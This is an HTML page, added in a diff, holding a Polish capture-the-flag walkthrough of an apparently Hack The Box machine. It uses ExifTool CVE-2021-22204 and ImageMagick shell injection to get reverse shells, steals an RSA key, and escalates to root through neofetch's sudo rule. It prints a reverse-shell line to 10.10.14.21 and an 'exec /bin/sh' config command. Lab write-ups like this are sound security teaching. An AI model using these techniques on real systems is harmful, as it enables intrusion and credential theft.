@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>META - site name</title>
+  </head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">site name</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">META</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1654777374555"
+                  >2022-06-09 08:22</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1655279212483"
+                  >2022-06-15 03:46</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p><img src="/_resources/afa894a59e454eada6e862980a89c1f3.png" />
+<img src="/_resources/aab9926b9f2441729b8429e3eb7831d7.png" />
+<img src="/_resources/d4a437353ec24a219202bc7757ac06c2.png" />
+<img src="/_resources/90f554bcae1a4366b20625ddd1e24039.png" />
+<img src="/_resources/987606ff2e5f4833908c5c2b43c22810.png" />
+<img src="/_resources/3cdb923148204e68926aa1a08e716147.png" />
+<img src="/_resources/782ea4f430714f558e3ffb665aa0128c.png" />
+<img src="/_resources/5978899c3b2240558f3fb9d8217fbc9b.png" />
+omówienie CVE	
+<a title="https://blog.convisoappsec.com/en/a-cae-study-on-cve-2021-22204-exiftool-rce/" href="https://blog.convisoappsec.com/en/a-cae-study-on-cve-2021-22204-exiftool-rce/">https://blog.convisoappsec.com/en/a-cae-study-on-cve-2021-22204-exiftool-rce/</a>
+tworzy obraz z payloadem i pozwala uzyskać reverse shell do usera www-data
+<a title="https://github.com/convisolabs/CVE-2021-22204-exiftool" href="https://github.com/convisolabs/CVE-2021-22204-exiftool">https://github.com/convisolabs/CVE-2021-22204-exiftool</a>
+<img src="/_resources/9bffe8329f7348208f874f1f7a7be75f.png" /></p>
+<p>przechwycone procesy za pomocą programu pspy64
+<img src="/_resources/743e413147e54b3680997648881dd554.png" />
+przeszukano pliki i pojawił się w skrypcie, który uruchamia program morgrify, skrypt wykonuje się z uprawnieniami użytkownika thomas
+<img src="/_resources/97c48bf146f04a4b980bdf417f9a1641.png" /></p>
+<p>skrypt wykonuje program mogrify z pakietu ImageMagic
+<img src="/_resources/1d887f758a9c4d1e992fa86a97ca93bf.png" />
+wykorzystana metoda ataku z użyciem ImageMagic pozwala na wstrzyknięcie kodu do pliku, umieszczeniu spreparowanego pliku w katalogu /var/www/dev01.artcorp.htb/converted_images/, zaczekanie na wykonanie operacji na pliku poprzez skrypt
+<a title="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html" href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html">https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</a>
+plik z kodem
+<img src="/_resources/ac31a60bbeff4efebb824e2592dc43a5.png" />
+polecenia powłoki (bash -i &gt;&amp; /dev/tcp/10.10.14.21/11111 0&gt;&amp;1) zostały zakodowane przy pomocy base64
+udało uzyskać się reverse shell oraz zdobyć klucz prywatny rsa
+<img src="/_resources/4a7e308daf154437aea5008aaa1d1759.png" />
+<img src="/_resources/6a561ff07c5149238c72cedf152ea5d7.png" />
+Użytkownik thomas ma prawo używać programu neofetch z uprawnieniami roota bez podawania hasła oraz zostaje zachowana zmienna środowiskowa XDG_CONFIG_HOME. Neofetch wykorzystuje tą zmienną w celu załadowani pliku konfiguracyjnego znajdującego się, w przypadku thomasa, w ~/.config/neofetch/config.conf .</p>
+<p><em>$XDG_CONFIG_HOME defines the base directory relative to which user specific configuration files should be stored. If $XDG_CONFIG_HOME is either not set or empty, a default equal to $HOME /. config should be used.</em></p>
+<p>Wcelu uzyskania uprawnień roota plik konfiguracyjny użytkownika thomas należy zmienić poprzez komendę: <em>echo ‘exec /bin/sh’ &gt; .config/neofetch/config.conf</em>, exportować wartość zmiennej XDG_CONFIG_HOME tak aby ścierzka prowadziła do folderu z plikami konfiguracyjnymi użytkownika thomas oraz uruchomić program neofetch z uprawnieniami roota
+<img src="/_resources/af5ec1c7a0c34cc9ac50a24549d75122.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
